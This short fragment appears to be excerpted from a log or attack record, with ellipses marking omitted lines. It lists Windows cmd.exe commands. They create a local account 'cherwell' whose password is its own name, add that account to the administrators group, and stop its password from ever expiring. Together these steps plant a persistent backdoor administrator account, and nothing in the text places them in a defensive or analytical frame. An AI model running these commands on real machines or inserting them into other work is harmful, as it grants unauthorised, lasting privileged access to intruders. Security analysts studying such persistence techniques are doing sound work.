...
cmd.exe /c net user /add cherwell cherwell
cmd.exe /c net localgroup administrators cherwell /add
...
cmd.exe /c wmic useraccount where "name='cherwell'" set PasswordExpires=FALSE
